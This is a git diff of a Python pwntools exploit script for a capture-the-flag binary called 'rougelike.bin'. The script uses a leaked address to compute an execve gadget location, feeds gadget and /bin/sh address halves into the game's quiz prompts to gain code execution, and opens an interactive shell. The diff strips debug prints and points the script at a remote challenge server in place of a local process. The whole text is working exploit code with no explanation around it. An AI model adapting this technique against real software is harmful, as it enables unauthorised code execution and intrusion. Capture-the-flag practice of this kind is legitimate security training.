@@ -92,6 +92,7 @@ def exploit(conn):
     current_dealloc_addr = (enemy_weapon << 32) + enemy_hp
     current_execve_gadget_addr = current_dealloc_addr - alloc_dealloc_addr + execve_gadget_addr
 
+    print(hex(current_execve_gadget_addr))
     fight(conn)
     yes_djinn(conn)
 
@@ -101,26 +102,20 @@ def exploit(conn):
         if any([word in line for word in ['AAAAAAAA', 'Unix timestamp', 'Richard Stallman', 'even prime', '3↑↑3']]):
             conn.sendline('0')
         elif 'Rust' in line:
-            print(str(upper(bin_sh)))
             conn.sendline(str(upper(bin_sh)))
         elif 'Linux released' in line:
-            print(str(lower(current_execve_gadget_addr)))
             conn.sendline(str((lower(current_execve_gadget_addr) << 32) + 0x11111111))
         elif 'SecChallenge' in line:
-            print(str(upper(current_execve_gadget_addr)))
             conn.sendline(str(upper(current_execve_gadget_addr)))
         else:
             conn.sendline('1')
 
 
-    input(">")
     defend(conn)
 
-    while True:
-        print(conn.recvline())
+    conn.interactive()
 
-
-conn = pwn.process('./rougelike.bin')
-#conn = pwn.remote('challenges.crysys.hu', 5010)
+# conn = pwn.process('./rougelike.bin')
+conn = pwn.remote('challenges.crysys.hu', 5008)
 
 exploit(conn)
